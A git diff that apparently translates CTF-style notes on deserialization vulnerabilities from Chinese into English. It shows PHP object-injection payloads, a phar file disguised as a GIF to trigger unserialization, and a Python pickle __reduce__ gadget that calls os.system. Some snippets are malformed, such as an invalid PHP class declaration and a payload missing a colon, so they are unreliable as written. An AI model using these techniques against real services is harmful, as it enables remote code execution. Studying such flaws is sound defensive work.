@@ -1,23 +1,24 @@
 # Unserialization
-多個語言都有反序列化的漏洞問題，記住基本觀念：**序列化：物件轉換成字串/反序列化：字串轉換成物件**。  
+Vulnerability of unserialization exists in many program languages，please remember the basic concept：**serialize：convert object to the string; unserialize：convert string to the object**.  
 *  [PHP Unserialization](#php-unserialization)  
    *  [Serialization vs Unserialization](#serialization-vs-unserialization)  
    *  [Magic Function](#magic-function)  
    *  [Exploit](#exploit)    
    *  [Reference](#reference)  
+   *  [With phar](#with-phar)  
 *  [Python Unserialization](#python-unserialization)  
    *  [Magic Function](#magic-function)  
    *  [Exploit](#exploit)  
    *  [Reference](#reference)
-   
+  
 
 # PHP Unserialization
-Cookie 和 session中常會用到。如果傳入unserialize()的參數會可控的話，將可以透過精心製造的payload去覆蓋一些已有的變量甚至控制程式流程。  
+It's always used in Cookie and session. If the parameter of `unserialize()` can be controlled，we can build up a payload to overwrite specific variable or change control flow.  
 
 ## Serialization vs Unserialization
-簡單的來說：  
-```serialize()```: 讓物件變成易於傳輸或儲存的值或字串  
-```unserialize()```: 上述過程的逆向反應  
+Basically speaking：  
+`serialize()`: convert object to string
+`unserialize()`: convert string to object  
 ```php
 class pwnch(){
   $test = "helloworld";
@@ -25,65 +26,75 @@ class pwnch(){
       echo "hello again";
   }
 }
-echo serialize(new pwnch());   // OUTPUT: O:5:"pwnch":1:{s:4:"test";s:10:"helloworld";} 
+echo serialize(new pwnch());   // OUTPUT: O:5:"pwnch":1:{s:4:"test";s:10:"helloworld";}
 ```
-OUTPUT: ```O``` 代表物件, ```5``` 是物件名的長度. ```1``` 是屬性大小, ```4``` 是變數名稱的長度, 後面整體的屬性構成是```key:value```.  
+OUTPUT: `O` means object, `5` is the length of object name. `1` is the size of attribute, `4` is the length of variable name, format is `key:value`.  
 
-型態 | 語法  
+Type | Syntax  
 ------------ | -------------  
-String | ```s:size:value;```  
-Integer | ```i:value;```  
-Boolean | ```b:value;```  
-NULL | ```N;```  
-Array | ```a:size:{key-type:key-value;value-type:value-value;}```  
-Object | ```O:strlen(Object):class-name:object size:```  
+String | `s:size:value;`  
+Integer | `i:value;`  
+Boolean | `b:value;`  
+NULL | `N;`  
+Array | `a:size:{key-type:key-value;value-type:value-value;}`  
+Object | `O:strlen(Object):class-name:object size:`  
 ------------ | -------------  
-public | ```{s:4:"test"}```  
-private | ```{s:11:"%00pwnch%00test"}```  
-protected | ```{s:7:"%00*%00test"}```  
+public | `{s:4:"test"}`  
+private | `{s:11:"%00pwnch%00test"}`  
+protected | `{s:7:"%00*%00test"}`  
 
 ## Magic Function
-* ```construct()```: new一個物件時會自動調用，但是unserialize()不會調用
-* ```destruct()```: 銷毀物件時自動調用，unserialize也會調用  
-* ```__sleep()```: serialize會優先執行sleep()  
-* ```__wakeup()```: unserialize會優先執行wakeup()  
+* `construct()`: called when new a object，but won't be called when unserialize()  
+* `destruct()`: called when destroy a object，also be called when unserialize  
+* `__sleep()`: run at the first moment of serialize  
+* `__wakeup()`: run at the first moment of unserialize  
 
 ## Exploit
-統整一下payload
+payload
 ```php
 unserialize($_GET[1]);
 
 1 = O:5:"pwnch":1:{s:4:"test";s:length of your code:"code you want to insert";}
 
-// 這邊可以覆蓋變量，記得要連同修改你自己塞入的payload長度  
+// Here you can overwrite the variable test，remember to modify the lenght of your code  
 
-
-// 那有滿滿的wakeup和destruct給你調用！
-// 自己找有用的gadget把它串起來  
+// find your own gadget  
 
 1 = O:5:"pwnch":1:{s:4:"test";O:6:"pwnch2":1{s:5:"test2";s:10:"echo `ls`;";}}
 
-// 上例中我強行將test中的constructor覆蓋成pwnch2，再進而覆蓋pwnch2裡的變量：因為pwnch2裡有我想要用的function
-
-// 本有想要在反序列化裡試試延伸數組的特性來建造php後門
-// 構造了很久都沒有成功
+// In second payload, I overwrite the constructor in variable test with pwnch2，then overwrite the variable test2 in pwnch2 because I need the function in pwn2!
 ```
 Tools:  
-* [php在线反序列化工具](https://1024tools.com/unserialize)
+* [php online tool](https://1024tools.com/unserialize)
 
 ## Reference
 1. [chybeta's blog](https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)  
 
+## With phar
+Sam Thomas published a new way to trigger a unserialization without use of `unserialize()` in blackhat 2018. This can be done with `php://phar`.  
+Trace to the kernel of PHP, we can find that `meta-data` would be unserialized when library function use `phar://` to parse the phar document. Therefore, we can build up a malicious phar and deliver to file functions such as `file_get_contents()` or `file_exists()`.  
+1. We might not be able to upload the phar file to the website directly. However, we can add other header to forge it.  
+```php
+$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");  // forge to gif
+
+$phar->setMetadata($o);   // here you can control the parameter to trigger vul of unserialization
+```  
+2. Trace any function: whether it calls file open function in the bottom side, then whether we can control its parameter. What's more interesting, it even can be used to make a DOS attack.  
+
+## Reference
+1. [Blackhat议题解读 | 利用 phar 拓展 php 反序列化漏洞攻击面](https://www.anquanke.com/post/id/157657)  
+2. [blackhat议题深入 | phar反序列化](https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485159&idx=1&sn=50b2e94d2d6fc5f69c540113ae9b3f1c&chksm=e89e2e3fdfe9a729869444aa593e97b52970add524b219553f646e8af2aec06e25e8678e7dde&mpshare=1&scene=23&srcid=0822QPN3ZXccNvKuWTQoahLi#rd)
+
 # Python unserialization
 [關於模塊的細節我相當推這篇文章](https://www.jianshu.com/p/5f936abf31f7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)  
-Python中的**pickle**和**cPickle**都可以實現序列化  
-1. ```cPickle.dumps```: obj -> str  
-2. ```cPickle.loads```: str -> obj  
-另外還可以使用dump/load，這裏就不做討論囉  
-python反序列化漏洞比php更嚴重，原因在於可以透過模塊造成RCE！  
+Functions **pickle** and **cPickle** also can realize the function of serialization  
+1. `cPickle.dumps`: object -> string  
+2. `cPickle.loads`: string -> object  
+You can also use dump/load，but I won't talk about it here.  
+vulnerability of unserialization in python is more serious than in php，we can use this module to build RCE！  
 
 ## Magic Function
-```reduce```時會完全改變被反序列化的對象，因此對象為可控的
+`reduce` will change the target of unserialization，therefore the parameter is controllable
 ```python
 // magic function: reduce
 import cPickle
@@ -94,18 +105,18 @@ class People(object):
     def __init__(self,username,password):
         self.username = username
         self.password = password
-        
+
     def __reduce__(self):
         return (os.system, ('ls',))
-        
+
 michael = People('admin','password')
 print cPickle.loads(cPickle.dumps(michael))
 // Output: ls (the result of ls
 ```  
-要觸發反序列化漏洞我們當然要使用```cPickle.loads```，他接受的參數為str型態，因此我們不能使用```cPickle.loads(michael)```，我這邊就先用dumps把它換成字串。  
+We need `cPickle.loads` to trigger the vulnerability. His type of parameter is string，therefore we cannot use `cPickle.loads(michael)`，I use dumps to convert it inside.  
 
 ## Exploit
-CTF裡面常常會與web結合，像是利用```<?php system("echo $data | python vul.py")?>```。```vul.py```中可能有個IO在接，我得把data塞入字串化後帶有**magic function**的物件。  
+It's always combined with the web in CTF，such as `<?php system("echo $data | python vul.py")?>`. There might be a IO in `vul.py`，so I should deliver my data to the object with **magic function** which has been converted to string.  
 
 ## Reference
 1. [Python反序列化小记](https://www.jianshu.com/p/061d2c594d97)  
